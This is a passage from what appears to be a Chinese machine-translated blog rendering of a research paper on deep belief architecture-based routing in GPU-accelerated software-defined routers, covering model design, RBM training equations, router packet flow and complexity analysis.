O集线器的性能，线速率可以进一步提高到100 Gbps [7]。此外，包括英特尔和思科在内的网络制造商正在采用类似的项目来开发SDR架构中的高性能计算设备并开发商业产品[4]，[5]。从上述工作中可以注意到，当前的可编程SDR可以提供有竞争力的线路速率（即，与传统的专用设计路由器相比，费用要低得多），同时保持灵活性和可扩展性的强度。</p>
<h2 id="2-2-深度学习与机器智能路由策略的相关研究工作"><a href="#2-2-深度学习与机器智能路由策略的相关研究工作" class="headerlink" title="2.2 深度学习与机器智能路由策略的相关研究工作"></a>2.2 深度学习与机器智能路由策略的相关研究工作</h2><img src = "2019_01_05_02.png" width = 80%>

<ul>
<li>图2：考虑系统模型和问题陈述。</li>
</ul>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于机器学习对于预测网络参数很有用，一些研究人员已经尝试利用人工神经网络（ANN）（一种机器学习技术）来预测网络流量[15]，链路带宽或其他指标[22]。超过几个时间间隔。然而，这些策略的效率受到传统机器学习技术的缺点的限制，主要是因为缺乏适当的深层结构学习算法，足够大的训练数据的可用性等等。实际上，根据[11]中的工作，尽管添加层可以在极其复杂的应用中提取更高级别的特征，但是包含许多隐藏层的传统深度神经网络架构表现出与浅层相比较差的性能。最近，深度学习成为一种有前途的计算模型，可以有效地利用多个处理层从多个抽象层次的数据中提取特征[11]。此方法使用通用非线性模块将一个级别的表示转换为更高和更抽象级别的表示，然后组合这些表示，通过它可以自动且准确地学习特征[23]。 2006年引入了Greedy Layer-Wise培训，利用无监督学习程序对深度神经网络体系结构进行预训练，彻底改变了深度学习技术[19]，[24]。通过Greedy LayerWise预训练，接着是基于反向传播算法的整个深层架构的微调，深度学习在语音识别等许多复杂应用中取得了创纪录的成果[25]等等。将深度学习应用于语音识别的一个很好的例子是Apple的智能助手叫做“Siri”[26]。在传统上由人类主导的其他领域，研究人员已经探索了深度学习的应用并取得了令人鼓舞的成果，例如谷歌的AlphaGo在非常复杂的棋盘游戏中[18]。从文献中可以明显看出，深度学习技术已成为通常需要大量计算的应用中的最新技术。一方面，深度学习应用仅限于图像&#x2F;字符&#x2F;模式识别和自然语言处理领域[11]。另一方面，尚未成功尝试对网络流量控制系统的深度学习，其仍继续经历不断增长的计算负担。这是因为连接到互联网的设备数量越来越多，全球网络流量在最近几十年中爆炸式增长[9]。因此，在设计路由策略以满足严格和不断变化的网络要求时，网络运营商需要考虑更多参数和更复杂的规则。根据[16]，深度学习具有很好的潜力，可以应用于网络流量控制系统，通过考虑各种要求来估计最佳路径。此外，由于将深度学习应用于路由仍然是一个非常新的主题，因此以前的研究工作都没有尝试将深度学习整合到SDR中。另一方面，我们的动机来自于SDR与深度学习密切相关的事实，因为许多SDR使用多核平台（例如GPU）。这为在SDR中采用基于深度学习的智能路由策略铺平了道路。从这一点来看，我们尝试通过采用GPU驱动的SDR来执行深度学习技术来估计下一个节点以实现更好的路由管理，从而考虑硬件和软件两个方面。</p>
<img src = "2019_01_05_03.png" width = 80%>

<ul>
<li>图3：考虑提出的深度学习系统的模型。</li>
</ul>
<h1 id="3-基于深度学习的路由策略设计"><a href="#3-基于深度学习的路由策略设计" class="headerlink" title="3. 基于深度学习的路由策略设计"></a>3. 基于深度学习的路由策略设计</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们将介绍如何设计深度学习结构以在GPU加速的SDR上构建路由表。首先，我们提出深度学习结构的输入和输出的详细表征，然后我们描述我们选择的架构，DBA。 接下来，讨论所提出的路由表构造方法如何在GPU加速的SDR上工作。</p>
<h2 id="3-1-输入和输出设计"><a href="#3-1-输入和输出设计" class="headerlink" title="3.1 输入和输出设计"></a>3.1 输入和输出设计</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们考虑的核心网络系统模型在图2中描绘，其包括多个有线骨干路由器。值得注意的是，也可以考虑无线骨干网络。在所考虑的网络中，假设边缘路由器连接到不同类型的网络，例如蜂窝网络，WMN等。从后面的网络生成的数据包到达边缘路由器，并且发往其他边缘路由器以进行传送。另一方面，内部路由器只负责将数据包转发到适当的边缘路由器。传统上，每个路由器周期性地将信令分组转发到其他路由器以通知延迟值或其到其邻居的链路的一些其他度量。然后，每个路由器可以利用该信息来计算用于将数据分组发送到目的地路由器的下一个节点。这种方法在大多数情况下都能很好地工作，因为每个路由器都可以根据获得的所有网络链路的信息做出最佳决策。然而，当网络中的一些路由器由于压倒性的流量需求而拥挤时，计算下一个节点的传统方法遭受慢收敛。同时，周期性信令交换加剧了交通拥堵。此外，传统的路由方法无法处理网络环境持续变得更加复杂的场景，这需要网络运营商考虑各种不相关的参数来确定路由规则。由于深度学习方法已应用于许多复杂的活动以自动探索各种输入之间的关系，我们尝试在本节的其余部分采用深度学习进行路由。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于在每个路由器处观察到的流量模式直接指示该路由器的流量情况，因此我们采用流量模式作为深度学习模型的输入。如第1节所述，深度学习结构用于计算路由路径。因此，我们选择路由路径作为模型的输出。因此，图3（a）表明深度结构的输入为业务模式、路由路径作为输出。之后，关键的挑战是如何表征深度学习结构的输入和输出。为了表征输入，我们使用每个路由器上的流量模式即每个时间间隔内路由器的入站数据包数量，如图3（b）所示。如果我们假设计入入站数据包的时间间隔是$\Delta t$秒，那么对于每个路由器，我们可以采用最后一个$\beta \Delta t$（$\beta$为正整数）秒内每个时间间隔内的入站数据包数量作为流量模式。因此，通过假设网络由$N$个路由器组成，我们可以使用$\beta$行和$N$列的矩阵来表示网络中所有路由器的流量模式，并将矩阵中的$\beta N$元素的值输入到深度学习结构的输入层。请注意，$\beta$的值不应该太大，因为很久以前的流量模式对当前网络分析没有影响。此外，如果$\beta$的值太大，则深度学习结构具有高复杂性和低效率。在我们提出的深度学习结构中，仿真结果表明，将$\beta$的值设置为1是足够准确的。因此，深度学习结构的输入可以看作是$N$维向量，其第$i^{th}$个元素是最后$\Delta t$秒内第$i^{th}$个路由器的流量模式。接下来，我们需要设计输出层。出于路由的目的，深度学习结构需要输出路由路径。因此，输出层可以设计为提供类似于集中式路由的整个路径，或者仅提供类似于分布式路由策略的下一个节点。由于其较低的复杂性和较高的容差，后者在我们的提案中被选择。对于由$N$个路由器组成的网络，我们使用由$N$个二进制元素组成的向量来表示输出。在向量中，只有一个元素的值为1，其顺序表示下一个节点。这意味着如果$N$维向量中的第$i^{th}$个元素是1，则选择所考虑的网络中的第$i^{th}$个路由器作为下一个节点。总之，我们可以使用两个$N$维向量$x$和$y$来表示深度学习结构的输入和输出，$x$和$y$的示例如下：</p>
<p>$$ x &#x3D; (tp_1, tp_2, …, tp_{N - 1}, tp_N), \tag{1}$$<br>$$ y &#x3D; (0, 1, …, 0, 0), \tag{2} $$</p>
<p>其中$tp_i$表示路由器$i$的流量模式，其由上一时间间隔中的入站数据包的数量来度量。 此外，在向量$y$中，我们可以发现$y_2 &#x3D; 1$，这意味着选择路由器2作为下一个节点。 由于$y$的二进制值，深度学习结构是逻辑回归模型，我们需要接下来设计。</p>
<h2 id="3-2-深度学习结构设计"><a href="#3-2-深度学习结构设计" class="headerlink" title="3.2 深度学习结构设计"></a>3.2 深度学习结构设计</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了设计深度学习结构，需要用于执行监督训练的标记数据（即，多组$(x, y)$）。 为了完成计算具有流量模式的下一个路由器的任务，我们选择图3（c）所示的DBA作为我们的深度学习结构，因为它在所有深度学习模型中最常见和有效[27]。 如图所示，我们假设DBA由L层，输入层，$x$，输出层，$y$和$(L - 2)$隐藏层组成。 DBA也可以看作是一堆$(L - 2)$受限玻尔兹曼机器（RBMs）和一个逻辑回归层作为顶层。 每个RBM的结构如图3（d）所示。可以看出，每个RBM由两层组成，可见层，$v$和隐藏层$h$。两层中的单元通过加权链路连接，而同一层中的单元未连接。应注意，对两层中的每个单元给予加权偏差。术语$w_{ji}$表示连接隐藏层中的单元$j$和可见层中的单元$i$的链路的重量。此外，$a_i$和$b_j$分别表示可见层中的单元$i$和隐藏层中的单元$j$的偏置。隐藏层中学习单元的激活值用作DBA中上RBM的“可见数据”。如第2.2节所述，深度学习训练过程包括两个步骤：初始化结构的Greedy Layer-Wise训练和微调结构的反向传播过程。对于DBA，初始过程是训练每个RBM，这是一个无监督的学习过程，原因是RBM是一个无向图形模型，其中可见层中的单元使用对称加权连接连接到随机隐藏单元，如图所示.3（d）[28]。在训练RBM时，将未标记的数据集给予可见层，并且重复调整权重和偏差的值，直到隐藏层可以重建可见层。因此，训练后的隐藏层可以看作是可见层的抽象特征。训练RBM是使隐藏层最小化重建错误的过程。为了对训练过程进行数学建模，我们使用如下给出的可见层的对数似然函数。然后，训练过程是更新权重和偏差的值以最大化对数似然函数的值。</p>
<p>$$ l(\theta, a) &#x3D; \sum_{t &#x3D; 1}^{m} log p(v^{(t)}) \tag{3} $$</p>
<p>其中$\theta$表示由隐藏层的权重和偏差的所有值组成的向量。 $\theta$可写为$\theta &#x3D; (w, b)$。$w$和$b$分别表示由隐藏单元$b_j$的所有权重，$w_{ji}$和偏差组成的向量。 $a$由可见单元的偏差组成，$a_i$。 $m$表示训练数据的数量。 $v^{(t)}$是$t^{th}$训练数据，其概率为$p(v^{(t)})$。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了最大化$l(\theta, a)$，我们可以使用$l(\theta, a)$的梯度下降来调整$w$，$a$和$b$，其可以在等式4和5中描述。</p>
<p>$$ \theta :&#x3D; \theta + \eta\frac{\partial l(\theta, a)}{\partial \theta} \tag{4} $$</p>
<p>$$ a_i :&#x3D; a_i + \eta\frac{\partial l(\theta, a)}{\partial a_i} \tag{5} $$</p>
<p>其中$\eta$是深度学习的学习率。 这里，$\theta$表示任何$w_{ji}$和任何$b_j$。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了计算$p(v)$的值（代表任何$p(v^{(t)})$），我们需要将RBM建模为能量模型，因为RBM是对数线性马尔可夫随机场（MRF）的特定形式[29]。 能量函数$E(v, h)$和联合概率函数$p(v, h)$定义如下。</p>
<p>$$ E(v, h) &#x3D; -\sum_{i} a_i v_i - \sum_{j} b_j h_j - \sum_{i}\sum_{j}h_j w_{ji} v_i \tag{6} $$</p>
<p>$$ p(v, h) &#x3D; \frac{e^{-E(v, h)}}{Z} \tag{7} $$</p>
<p>$$ Z &#x3D; \sum_{v} \sum_{h} e^{-E(v, h)} \tag{8} $$</p>
<p>其中$v_i$和$h_j$分别是图3（d）所示的可见层中的单元$i$和隐藏层中的单元$j$。 $Z$表示归一化常数分区函数。 此外，$p(v)$和$p(v, h)$之间的关系可以表示如下。</p>
<p>$$ p(v) &#x3D; \sum_{h} p(v, h) \tag{9} $$</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用等式3到9来获得$\theta$[28]的值。然而，等式8中$\sum_{v} \sum_{h}$的计算的复杂度是$2^{n_v + n_h}$，其非常高（$n_v$和$n_h$分别表示向量$v$和$h$的维度）。另一个问题是，为了计算等式8，有必要但不可能考虑$v$和$h$的所有可能值而不是仅考虑所获得的训练数据。为了解决这些问题，Hinton等人。提出了对比分歧（CD）方法[30]。 CD的主要思想是使用吉布斯采样方法对v和h的值进行采样以逼近实际值，因为一层的条件分布概率（同时给出了另一层的值），例如$p(v | h; \theta, a)$，可以计算出来。文中省略了CD的详细程序，可以在[30]中找到。由于每个单元的值独立于同一层中的其他单元，当一个层固定时，另一层的条件分布概率可以如下计算，</p>
<p>$$ p(v | h; \theta, a) &#x3D; \prod_i p(v_i | h; \theta, a) \tag{10} $$</p>
<p>$$ p(h | v; \theta, a) &#x3D; \prod_j p(h_j | v; \theta, a) \tag{11} $$</p>
<p>其中$p(v | h; \theta, a)$和$p(h | v; \theta, a)$分别是给定h的v的条件概率和给定$v$的$h$的条件概率。$p(v_i | h; \theta, a)$是隐藏层固定时可见层中单元$i$的条件概率分布。 此外，$p(h_j | v; \theta, a)$是当可见层固定时隐藏层中单元$j$的条件概率分布。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果可见层和隐藏层中的单元的值都是二进制的，则$p(v_i &#x3D; 1 | h; \theta, a)$和$p(h_j &#x3D; 1 | v; \theta, a)$如下给出。</p>
<p>$$ p(v_i &#x3D; 1 | h; \theta, a) &#x3D; sigm(\sum_{j} w_{ji} h_j + a_i) \tag{12} $$</p>
<p>$$ p(h_j &#x3D; 1 | v; \theta, a) &#x3D; sigm(\sum_{i} w_{ji} v_i + b_j) \tag{13} $$</p>
<p>其中$sigm$表示$sigmoid$激活函数，$sigm(x) &#x3D; \frac{1}{1 + e^{-x}}$。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于表示入站数据包数量的DBA输入单元的值是连续的并受许多因素的影响，我们使用高斯概率分布来模拟流量模式[31]。因此，对于我们提出的DBA中的$RBM_1$，等式6和等式12应该修改如下。</p>
<p>$$ E(v, h) &#x3D; -\sum_{i} \frac{(v_i - a_i)^2}{2\sigma_i^2} - \sum_{j} b_j h_j - \sum_{i}\sum_{j} \frac{v_i}{\sigma_i} h_j w_{ji} \tag{14} $$</p>
<p>$$ p(v_i | h; \theta, a) &#x3D; N(a_i + \sigma_i \sum_{j} h_j w_{ji}, \sigma_i^2) \tag{15} $$</p>
<p>其中$\sigma_i$是单位$v_i$的方差值。 $N(a_i + \sigma_i \sum_{j} h_j w_{ji}, \sigma_i^2)$表示具有平均值$(a_i + \sigma_i \sum_{j} h_j w_{ji})$和方差$\sigma_i$的高斯分布。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图3（b）所示，最后一个RBM, $RBM_{L - 2}$由三层DBA组成，因为DBA在我们的提案中经过了监督培训[32]。 因此，$RBM_{L - 2}$的可见层不仅包括$RBM_{L - 3}$的隐藏层，还包括DBA的输出层$y$。 它的隐藏层是DBA的顶层隐藏层。 $RBM_{L - 2}$的结构如图3（e）所示，其能量函数表示如下。 为了与其他RBM保持一致，我们使用$v$和$h$分别表示$RBM_{L - 3}$的隐藏层和顶部隐藏层。</p>
<p>$$ E(v, h, y) &#x3D; -\sum_{i} a_i v_i - \sum_{j} b_j h_j - \sum_{k} c_k y_k \\ - \sum_{i} \sum_{j} h_j w_{ji} v_i - \sum_{j} \sum_{k} h_j w_{jk} y_k \tag{16} $$</p>
<p>其中$y$表示输出层中的向量。 $c_k$是单位$y_k$的偏差。 $w_{jk}$表示连接单元$h_j$和$y_k$的链路的权重。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于$v$和$y$中的单位彼此独立，因此由$v$和$y$组成的连接向量的条件分布是，</p>
<p>$$ p(v, y | h; \theta, a) &#x3D; p(v | h; \theta, a)p(y | h; \theta, a) \\ &#x3D; \prod_{i} p(v_i | h; \theta, a) \prod_{k} p(y_k | h; \theta, a) \tag{17} $$</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们使用上述方法来训练每个RBM。 在给定的训练数据中，第一RBM的可见层的值是$x$。 并且在训练每个RBM之后，其隐藏层的学习激活值被用作DBA中下一个RBM的“数据”。 在这里，我们可以发现，我们通过训练RBM一次训练DBA的一个隐藏层。 以这种方式，DBA被初始化并且$\theta$的值几乎是最佳的。 然后利用反向传播的方法来微调DBA。 我们监督训练的目的是最小化DBA的输出（由$h_\theta(x)$表示）与标记的输出$y$之间的差异。 我们使用交叉熵成本函数来测量它们在公式18 [28]中给出的差异。</p>
<p>$$ C(\theta) &#x3D; -\frac{1}{m} \sum_{t &#x3D; 1}^{m} (y^{(t)} log(h_\theta(x^{(t)})) \\ + (1 - y^{(t)}) log(1 - h_\theta(x^{(t)}))) \\ + \frac{\lambda}{2} \sum_{l &#x3D; 2}^{L} \sum_{j &#x3D; 1}^{n_l} \sum_{i &#x3D; 1}^{n_{l - 1}} (w_{ji}^{(l)})^2 \tag{18} $$</p>
<img src = "2019_01_15_04.png" width = 80%>
- 图4：GPU的架构以及如何在GPU加速的SDR中传递数据包的步骤。

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里，$(x^{(t)}, y^{(t)})$是$t^{th}$训练数据。 $h_\theta(x^{(t)})$表示当DBA的参数是$\theta$并且输入是$x^{(t)}$时DBA的输出。 在等式的右边，我们可以发现$C(\theta)$由两部分组成。 第一部分表示DBA输出与标记输出之间的差异，当$y^{(t)} &#x3D; h_\theta(x^{(t)}) &#x3D; 0$或1时，对于所有$t$，其值为0，否则，大于0。 part用于防止训练过程过度拟合。 为了最小化反向传播过程中$C(\theta)$的值，我们使用$C(\theta)$的梯度下降来更新$\theta$，如公式19 [33]所示。</p>
<p>$$ \theta :&#x3D; \theta - \eta_{bp}\frac{\partial C(\theta)}{\partial \theta} \tag{19} $$</p>
<p>其中$\eta_{bp}$是反向传播过程中的学习率。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;微调算法有效地工作，因为$\theta$的值通过Greedy LayerWise训练方法得到很好的初始化，而不是随机设置。 在微调DBA之后，我们可以获得参数$\theta(w, b)$的最佳值。 $a$的值不在反向传播步骤中训练，因为它不属于最终的DBA，并且仅用于训练每个RBM。 在本节的其余部分，我们将演示如何在GPU加速的SDR中使用所提出的深度学习结构。</p>
<h2 id="3-3-考虑路由器架构"><a href="#3-3-考虑路由器架构" class="headerlink" title="3.3 考虑路由器架构"></a>3.3 考虑路由器架构</h2><p>在本节中，我们简要介绍了GPU体系结构以及在一般PC平台上工作的基于深度学习的路由策略的过程，可以将其视为我们考虑的SDR。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图4所示，GPU由全局存储器，L2高速缓存和若干流处理多处理器（SM）组成，每个处理器由许多流处理器（SP）组成。 由于GPU具有许多计算核心，因此在接收工作负载时会同时启动数万个线程，并且每个线程在不同的数据集上运行相同的程序。 因此，GPU计算被认为是单指令多数据（SIMD）编程模型，其非常适合于运行深度学习。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如第1部分所述，基于普通PC的GPU加速SDR的报告线速率已高达40 Gbps，在本文中，我们选择一般的基于PC的SDR来构建路由表并执行我们的深度学习基于路由算法。图4示出了分组如何通过所考虑的SDR的架构中的相关四个部分的步骤，即GPU，CPU，网络接口卡（NIC）和主存储器。为了运行基于深度学习的路由算法，每个SDR都需要在训练阶段进行初始化，在此期间，网络中的SDR不需要处理任何数据包，只需利用他们的GPU来训练他们的DBA并记录最终值。他们的DBA的参数。在训练阶段之后，网络中的所有路由器都需要将其DBA的参数值发送到所有边缘路由器。因此，每个边缘路由器都可以使用这些参数来恢复任何DBA，以便在运行阶段构建到任何目标路由器的整个路径，而内部路由器只根据路径转发数据包。如图4所示，我们根据SDR中传输数据包的顺序给出了GPU加速SDR的主要架构和标签。我们可以发现（1）进入NIC的数据包通过直接内存访问（DMA）复制到主机内存。在整个过程中，（2）CPU从主存储器复制一些数据包以填充其缓冲区。 （3）然后在CPU上运行的软件分析这些数据包并采取一些必要的过程，如错误检查，减少寿命等。此外，CPU对不同类型的分组采用不同的过程。 （4）对于数据包，CPU提取标头并将它们发送到GPU的全局存储器，而CPU将整个信令包发送到GPU的存储器。请注意，CPU需要缓冲数据包和信令包的标头，直到达到给定的大小，然后将批量的标头或数据包发送到GPU，而不是逐个发送。由于GPU可以并行处理数百个数据包，因此批处理可以提高吞吐量，而其对延迟的负面影响已被证明可以忽略不计[6]。 （5）在从CPU获得报头和数据包之后，应该注意边缘路由器和内部路由器的GPU执行不同的数据包处理。在边缘路由器的GPU上运行的软件使用信令分组携带的流量模式作为恢复的DBA的输入。然后，DBA可以输出下一个节点，边缘路由器的GPU可以利用这些节点构建数据包的整个路径，并将相应的路径附加到接收的报头。另外，GPU还需要将每个分组的下一个节点信息发送到CPU。另一方面，内部路由器的GPU不需要计算数据包的路径，只需读取数据包头中的路径并将结果发送到CPU。此外，每个GPU并行处理这些标头并在缓冲区中填充它们。然后，CPU（6）从GPU复制处理后的数据包的头部，并且（7）将包复制回主存储器。同时，（8）CPU指示NIC转发批处理的位置，之后，（9）NIC通过另一个DMA从主存储器取出数据包。此外，可以删除将数据包复制到GPU和从GPU复制数据包的过程，因为我们可以利用GPU和CPU的映射存储器，从而可以进一步减少延迟。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们提供了我们考虑的系统模型，深度学习结构，并解释了基于GPU的SDR如何利用深度学习结构。 在下一节中，我们将介绍我们提出的基于深度学习的路由算法的步骤。</p>
<h1 id="4-基于建议的深度学习路由策略的程序"><a href="#4-基于建议的深度学习路由策略的程序" class="headerlink" title="4 基于建议的深度学习路由策略的程序"></a>4 基于建议的深度学习路由策略的程序</h1><p>在本节中，我们将重点介绍利用DBA计算下一个节点的过程，这些节点用于构建图2中所考虑的核心网络中的路由路径。这些过程可分为三个步骤，即初始化，训练和运行阶段。 下面提供了三个阶段的细节。</p>
<h2 id="4-1-初始化阶段"><a href="#4-1-初始化阶段" class="headerlink" title="4.1 初始化阶段"></a>4.1 初始化阶段</h2><p>在初始化阶段，我们需要获取数据来训练我们提出的DBA。 如第3节所述，我们采用监督学习来训练我们提出的DBA系统。 因此，初始化阶段的目标是获得由输入矢量和相应的输出矢量组成的标记数据。 如前面部分所述，输入向量应该是所考虑的核心网络中路由器的流量模式。 输出向量应指示对应于给定流量模式的下一个节点。 为了获得这种训练数据，我们可以接近许多可用的数据集源，例如应用互联网数据分析中心（CAIDA）[34]，并提取交通信息和相关的路由路径。 另一种方法是在我们考虑的网络中运行传统的路由协议，并记录每个路由器及其路由表的入站数据包的数量。</p>
<h2 id="4-2-训练阶段"><a href="#4-2-训练阶段" class="headerlink" title="4.2 训练阶段"></a>4.2 训练阶段</h2><p>在培训阶段，我们使用获得的数据来训练我们设计的DBA。 训练过程包括两个步骤：使用Greedy Layer-Wise训练方法初始化每个DBA，并使用反向传播方法微调参数$\theta(w, b)$。 在训练阶段之后，我们可以获得$\theta(w, b)$的值。</p>
<img src = "2019_01_15_05.png" width = 80%>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如第3.1节所述，DBA的输出是表示下一个节点的向量，这意味着它需要几个DBA来构建整个路径。假设网络中只有一个路由器训练并运行所有DBA，并且像网络中的集中控制策略一样产生网络中的所有路径，则路由器的计算量将非常高。而且，这样的中央路由器需要大量的时间和资源来计算所有路径，导致延迟增加和无保证的准确性。为了减少对路由器的计算要求并提高学习准确性，我们将训练任务分成几个部分，并将它们分发到目标核心&#x2F;骨干网络中的每个路由器。这意味着所考虑的网络中的每个路由器都需要训练多个DBA，每个DBA计算从其自身到目的地路由器的下一个节点。路由器需要训练的DBA数量取决于其目标路由器的数量。设$N$和$I$分别表示路由器的总数和内部路由器的数量。因此，每个内部路由器的目标节点数量是$(N - I)$，而每个边缘路由器具有$(N - I - 1)$个目标节点，因为源路由器和目标路由器不能相同。因此，每个内部路由器都需要训练$(N - I)$DBAs，而所有边缘路由器都需要训练$(N - I - 1)$DBAs。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了更清楚地描述培训阶段，我们只关注一个DBA的培训程序，这也适用于我们提案中的其他DBA。训练DBA的主要程序在算法1中给出。训练阶段的输入是训练数据$(x, y)$以及DBA，$L$和$n$的参数，以及学习速率，$\eta_{CD}$和$\eta_{bp}$。如算法1所示，训练阶段主要包括两个步骤：贪婪层智能训练循环，训练每个RBM，如步骤1至3所示，以及后面的反向传播过程，以微调链接之间的链接权重。步骤4中显示的图层。通过Greedy Layer-Wise训练，DBA初始化时$\theta (w, b)$的值几乎达到全局最优值。然后使用反向传播算法来微调整个结构以最小化成本函数的值。在成本函数不超过给定值或次数达到上限之前，调整过程不会停止。一旦反向传播结束，就记录每个DBA的$\theta (w, b)$的值。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如前所述，每个边缘路由器都需要训练$(N - I - 1)$DBAs，而每个内部路由器需要训练$(N - I)$DBAs，这意味着每个边缘路由器都可以获得$(N - I - 1)$个DBAs的$\theta$ 每个内部路由器可以获得$(N  -  I)$DBAs的$\theta$。 然后，每个边缘路由器需要将其$(N - 1 - 1)$DBAs的$\theta$发送到其他$(N - 1 -1)$边缘路由器。 此外，每个内部路由器都需要将其$(N - I)$DBAs的$\theta$发送到所有边缘路由器。 因此，每个边缘路由器获得网络中所有路由器的所有DBAs的$\theta$，并且$\theta$的组数是$(N - 1)(N - 1)$。 让$DBA_{ij}$代表路由器$i$中的DBA作为目的路由器$j$，$\theta_{ij}$是其参数。 由于边缘路由器获得网络中所有DBA的$\theta$，因此它们可以用$\theta_{ij}$构造相应的$DBA_{ij}$。 应该注意的是，$i \neq j$。</p>
<ul>
<li>表1: $R_3$中内置的路由表</li>
</ul>
<table>
<thead>
<tr>
<th align="center">终点</th>
<th align="center">路径</th>
</tr>
</thead>
<tbody><tr>
<td align="center">$R_1$</td>
<td align="center">$R_3 \rightarrow R_2 \rightarrow R_1$</td>
</tr>
<tr>
<td align="center">$R_2$</td>
<td align="center">$R_3 \rightarrow R_2$</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">$R_{12}$</td>
<td align="center">$R_3 \rightarrow R_7 \rightarrow R_{11} \rightarrow R_{12}$</td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">$R_{16}$</td>
<td align="center">$R_3 \rightarrow R_7 \rightarrow R_{11} \rightarrow R_{15} \rightarrow R_{16}$</td>
</tr>
</tbody></table>
<h2 id="4-3-运行阶段"><a href="#4-3-运行阶段" class="headerlink" title="4.3 运行阶段"></a>4.3 运行阶段</h2><p>在运行阶段，网络中的所有路由器都需要定期将其入站数据包的数量记录为流量模式，并将它们发送到边缘路由器。然后，每个边缘路由器都可以将流量模式输入到其DBA，以获得到其他边缘路由器的下一个节点。此外，由于每个边缘路由器都获得其他路由器的DBAs的参数$\theta$，因此它可以构建网络中的任何DBA并计算从任何路由器到任何目的地边缘路由器的下一个节点。因此，每个边缘路由器可以利用下一个节点信息来构建从自身到所有其他边缘路由器的整个路径。该算法在算法2中示出。这里，我们使用$N$个元素的数组$TP[N]$来保存网络中$N$个路由器的入站分组数以表示流量模式，并且$\theta[N - I][N - 1]$保存网络中所有DBAs的参数。另一个阵列$\varepsilon R[N-I]$用于保存网络中边缘路由器的序列号，因为它们不是连续的。在实际网络情况下，$\varepsilon R [N-I]$用于保存所有目标路由器的IP地址。运行算法2后，每个边缘路由器都可以获得DBA的输出，以构建到$(N - I - 1)$个边缘路由器的路径。我们可以使用矩阵$NR[N][N-I-1]$来保存这些DBA的结果，这些DBA可用于构建到所有其他边缘路由器的整个路径。表1是路由器$R_3$中内置的路由表，图2示出了构建从$R_3$到$R_{16}$的整个路径的过程的示例。</p>
<img src = "2019_01_15_06.png" width = 80%>

<h1 id="5-复杂性分析"><a href="#5-复杂性分析" class="headerlink" title="5. 复杂性分析"></a>5. 复杂性分析</h1><p>在本节中，我们分析了在所考虑的SDR上运行所提出的基于深度学习的路由策略的算法复杂度和时间成本。 我们的分析主要集中在训练阶段和运行阶段的算法复杂度的数值分析，通过计算加法运算的次数+，减法运算-，乘法运算×，除法运算÷，平方根运算$\sqrt{}$，指数运算$e^x$和否定操作。为了清楚地表达，每种操作的时间成本由ADD，SUB，MUL，DIV，SQRT，EXP和NEG表示。 然后，我们评估并比较在GPU和CPU上运行两个阶段的时间成本。</p>
<img src = "2019_01_15_07.png" width = 80%>

<h2 id="5-1-训练阶段的复杂性分析"><a href="#5-1-训练阶段的复杂性分析" class="headerlink" title="5.1 训练阶段的复杂性分析"></a>5.1 训练阶段的复杂性分析</h2><p>训练阶段的主要过程包括训练每个RBM并对算法1中所示的整个DBA进行微调。每个RBM的训练算法在算法3中示出，算法3是无监督的训练过程。 假设可见层和隐藏层中的单元数分别为$n_v$和$n_h$。 训练集的数量是$m$。 首先，从算法3的步骤1到步骤4，我们需要初始化$w$，$a$，$b$和$\Delta w$，$\Delta a$，$\Delta b$。 然后，我们重复利用所有训练样例来更新$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$的值，用CD的方法调整$w$，$a$，$b$ [30]。 如步骤7至步骤19所示，CD方法主要由两个周期组成。 第一个周期是采用吉布斯采样的方法，根据步骤7到步骤14所示的条件概率分布得到$h_j$和$v_i^{\prime}$的样本值。其次，获得的样本值$v_i^{\prime}$用于更新$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$，根据步骤15至步骤19。因此，$\Delta w_{ji}$，$\Delta a_i$，$\Delta b_j$的值可用于更新步骤21至步骤25中所示的$w_{ji}$，$a_i$，$b_j$。整个训练过程重复$r_1$次，取$r_1((3m + 1)n_v n_h + 3mn_v + (2m + 1)n_h)ADD + r_1(mn_v n_h + (m + 1)n_v + mn_h)SUB + r_1((4m + 6)n_v n_h + n_v + n_h)MUL + r_1(2n_v n_h + (m + 1)n_v + mn_h)DIV + r_1 n_v n_h(EXP + NEG + SQRT)$</p>
